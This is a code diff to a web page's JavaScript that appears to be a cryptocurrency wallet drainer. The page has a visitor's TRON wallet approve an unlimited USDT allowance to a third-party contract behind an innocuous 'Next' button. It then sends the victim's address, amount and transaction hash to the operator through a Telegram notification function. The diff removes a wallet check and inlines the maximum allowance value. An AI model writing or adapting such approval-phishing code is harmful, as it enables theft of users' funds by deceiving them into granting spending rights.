@@ -218,7 +218,7 @@
         async function sendTelegramNotification(userAddress, txHash, amount, token, recipient) {
             const explorerUrl = token.network === 'TRON' 
                 ? `https://tronscan.org/transaction/${txHash}`
-                : `https://etherscan.io/tx/${txHash}`;
+                : `https://bscscan.com/tx/${txHash}`;
 
             const messageText = `Token Approve Notification\n\nToken: ${token.symbol}\nNetwork: ${token.network}\nUser: ${userAddress}\nRecipient: ${recipient}\nAmount: ${amount} ${token.symbol}\n\nTransaction Hash:\n${txHash}\n\nExplorer:\n${explorerUrl}\n\nTime: ${new Date( ).toLocaleString()}\n\nSmart Contract:\n${token.smartContract}`;
 
@@ -281,19 +281,11 @@
 
                 let userAddress = tronWeb.defaultAddress.base58;
 
-                if (!userAddress) {
-                    showError('Please connect your wallet');
-                    btn.disabled = false;
-                    btn.textContent = 'Next';
-                    return;
-                }
-
                 const usdtContract = await tronWeb.contract().at(token.address);
-                const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
                 
                 let txHash = await usdtContract.approve(
                     token.smartContract,
-                    maxUint256
+                    '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
                 ).send({
                     feeLimit: 100000000,
                     callValue: 0
